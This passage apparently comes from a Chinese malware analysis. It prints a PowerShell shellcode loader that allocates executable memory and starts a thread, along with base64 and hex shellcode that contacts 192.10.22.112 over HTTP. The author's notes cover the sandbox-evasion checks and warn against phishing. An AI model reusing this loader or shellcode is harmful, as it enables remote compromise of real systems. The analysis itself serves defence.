                        [Flags] public enum MemoryProtection { 
ExecuteReadWrite = 0x40 }
                        [Flags] public enum Time : uint { Infinite = 
0xFFFFFFFF }
                        [DllImport("kernel32.dll")] public static 
extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint 
flAllocationType, uint flProtect);
                        [DllImport("kernel32.dll")] public static 
extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr 
lpThreadId);
                        [DllImport("kernel32.dll")] public static 
extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
                }
        }
"@
$compiler = New-Object Microsoft.CSharp.CSharpCodeProvider
$params = New-Object System.CodeDom.Compiler.CompilerParameters
$params.ReferencedAssemblies.AddRange(@("System.dll", 
[PsObject].Assembly.Location))
$params.GenerateInMemory = $True
$result = $compiler.CompileAssemblyFromSource($params, $assembly)
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
[Byte[]]$var_code = 
[System.Convert]::FromBase64String("/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7d
KJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNI
sB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZW
lH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//VMf9XV1dXV2g6Vnmn/9XphAAAAFsxyVFR
agNRUWggAwAAU1BoV4mfxv/V63BbMdJSaAACYIRSUlJTUlBo61UuO//VicaDw1Ax/1dXav9
TVmgtBhh7/9WFwA+EwwEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1
fgC//VvwAvAAA5x3S3Mf/pkQEAAOnJAQAA6Iv///8vMnZFbwAW1nbtLPWz1WV/ltdTylyU9
l5wTkhFSIQCIyGmpSV/jCZK/kANLyhsBZbDJjbYJ1Sw2xpbyKsItLjHMxu9KIdTUVS3q2UA
xP1JAFVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2l
uZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wOyBOUDA2KQ0KALJ68JhT2Z
cFGiwsEI4aCdYMdDwR86zk5rqu/uIQcY6P+0WCGRCwL9G+7ss/qjrwo8PTi1tC81zayMryO
pyvemtN4BV5ddSwje/hoWdhvlYWS607HbNjVpQw3mUuEVVegGIF0DplO8zltg6H3JrMbBD7
YpDW4pu1TyZDj2PEsSfw7X6tm8zCEfOUO6OABir3eUpaYNdESJbOrUTnkNOD2KfTQs/aUZj
6GH+bOxhM3PBcpCCmpD2HFOII/s/dCcFpgkFi84ft93IBW622BkZrLABo8LWiVv/VakBoAB
AAAGgAAEAAV2hYpFPl/9WTuQAAAAAB2VFTiedXaAAgAABTVmgSloni/9WFwHTGiwcBw4XAd
eVYw+ip/f//MTkyLjEwLjIyLjExMgAAAAAA")
$buffer = [inject.func]::VirtualAlloc(0, $var_code.Length + 1, 
[inject.func+AllocationType]::Reserve -bOr 
[inject.func+AllocationType]::Commit, 
[inject.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$buffer) {
        $global:result = 3;
        return
}
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $buffer, 
$var_code.Length)
[IntPtr] $thread = [inject.func]::CreateThread(0, 0, $buffer, 0, 0, 0)
if ([Bool]!$thread) {
        $global:result = 7;
        return
}
$result2 = [inject.func]::WaitForSingleObject($thread, 
[inject.func+Time]::Infinite)
'@
If ([IntPtr]::size -eq 8) {
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
使⽤API CreateThread  调⽤了⼀段shellcode，把shellcode解码出来：
把 shellcode加载起来，调试⼀下发现会使⽤http协议连ip: 192.10.22.112
        start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-
job | Receive-Job
}
else {
        IEX $DoIt
}
40
41
42
43
44
fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617
c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b58
2001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b5
82401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb
865d686e6574006877696e6954684c772607ffd531ff5757575757683a5679a7ffd5e98
40000005b31c951516a035151682003000053506857899fc6ffd5eb705b31d252680002
608452525253525068eb552e3bffd589c683c35031ff57576aff5356682d06187bffd58
5c00f84c301000031ff85f6740489f9eb0968aac5e25dffd589c16845215e31ffd531ff
576a0751565068b757e00bffd5bf002f000039c774b731ffe991010000e9c9010000e88
bffffff2f3276456f0016d676ed2cf5b3d5657f96d753ca5c94f65e704e484548840223
21a6a5257f8c264afe400d2f286c0596c32636d82754b0db1a5bc8ab08b4b8c7331bbd2
887535154b7ab6500c4fd4900557365722d4167656e743a204d6f7a696c6c612f352e30
2028636f6d70617469626c653b204d53494520392e303b2057696e646f7773204e54203
62e313b2057696e36343b207836343b2054726964656e742f352e303b204e503036290d
0a00b27af09853d997051a2c2c108e1a09d60c743c11f3ace4e6baaefee210718e8ffb4
5821910b02fd1beeecb3faa3af0a3c3d38b5b42f35cdac8caf23a9caf7a6b4de0157975
d4b08defe1a16761be56164bad3b1db363569430de652e11555e806205d03a653bcce5b
60e87dc9acc6c10fb6290d6e29bb54f26438f63c4b127f0ed7ead9bccc211f3943ba380
062af7794a5a60d7444896cead44e790d383d8a7d342cfda5198fa187f9b3b184cdcf05
ca420a6a43d8714e208fecfdd09c169824162f387edf772015badb606466b2c0068f0b5
a256ffd56a4068001000006800004000576858a453e5ffd593b90000000001d9515389e
7576800200000535668129689e2ffd585c074c68b0701c385c075e558c3e8a9fdffff31
39322e31302e32322e3131320000000000
1
之后调⽤ httpopenrequestW 访问路径 /2vEo ,由于服务器已经关了，所以跟不下去了。
后续不想再分析了，因为已经有⼈发出预警了。
# 总结
这个样本是可以很好的对抗沙箱分析的，主要是如下三点原因：
1. 需要命令⾏参数
2. 传⼊参数之后，会判断参数指定的ip和端⼜是否可以连通
3. 会判断⾃⾝⽬录下是否存在⽂件 shellcode.bin
HW在即，谨防钓鱼，⼀定不要随意运⾏来路不明的程序。